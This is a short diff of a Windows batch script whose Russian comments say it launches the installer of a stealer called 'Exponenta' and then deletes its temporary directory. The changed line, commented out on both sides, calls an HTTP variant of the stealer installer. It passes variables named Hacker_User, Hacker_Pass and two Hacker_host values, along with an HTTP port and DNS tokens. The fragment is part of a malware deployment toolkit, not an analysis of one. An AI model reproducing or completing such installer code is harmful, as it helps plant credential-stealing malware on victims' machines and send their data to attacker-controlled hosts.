@@ -25,7 +25,7 @@ rem Go to Temprorary Directory
 cd /d %curdir%
 
 rem Запускаем инсталлятор Stealer "Экспонента"
-rem call install_Styler.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% %hldnstoken% %entrydnstoken%
+rem call install_StylerHTTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% %Hacker_httppref% %Hacker_httpport% %hldnstoken% %entrydnstoken%
 cd /d %curdir%
 
 rem Удаляем временный каталог
